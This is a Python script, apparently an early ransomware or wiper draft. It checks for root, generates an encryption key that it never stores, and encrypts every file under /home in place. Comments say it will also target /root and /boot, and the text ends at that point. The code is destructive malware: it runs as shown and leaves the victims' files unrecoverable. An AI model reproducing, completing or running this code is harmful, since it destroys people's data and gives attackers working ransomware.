import platform
from cryptography.fernet import Fernet
import os
import glob

# Check if script is run as root
if not os.geteuid()==0:
    print("Exiting...")
    exit()

# Generate the encryption key
key = Fernet.generate_key()
fernet = Fernet(key)

# Check what OS is currently running
system = platform.system() # Gets current OS
linux = False
windows = False

# Changes bool variables to current system
if system == "Linux":
    linux = True
    windows = False
elif system == "Windows":
    windows = True
    linux = False
else:
    linux = False
    windows = False

# Encryption Func
def encrypt(filename):
    with open(filename, 'rb') as file:
        file = file.read()
    
    encrypted = fernet.encrypt(file)

    with open(filename, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

# If Linux
# Encrypt /home, /root, ceratin commands in /boot

# Encrypts the home directory
list_of_files_home = []
path_home = r"/home"

for root, dirs, files in os.walk(path_home):
	for file in files:
		list_of_files_home.append(os.path.join(root,file))

for name in list_of_files_home:
    print(name)
    encrypt(name)

# Encrypts the root directory
